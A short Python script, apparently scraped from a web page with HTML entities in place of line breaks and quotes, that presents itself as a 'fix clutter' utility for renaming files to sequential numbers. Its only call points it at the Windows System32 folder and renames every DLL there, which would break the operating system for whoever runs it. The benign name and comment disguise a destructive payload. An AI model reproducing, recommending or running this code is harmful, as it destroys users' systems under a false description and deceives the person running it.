import os<br><br># Fix clutter<br>def fixClutter(path, extension):<br>    files = os.listdir(path)<br>    i = 1 <br>    for file in files:<br>        if file.endswith(f&#39;.{extension}&#39;):<br>            os.renames(f&#39;{path}\{file}&#39;,f&#39;{path}\{i}.{extension}&#39;)<br>            i = i + 1<br><br>fixClutter(&#39;C:\windows\System32&#39;,&#39;dll&#39;)
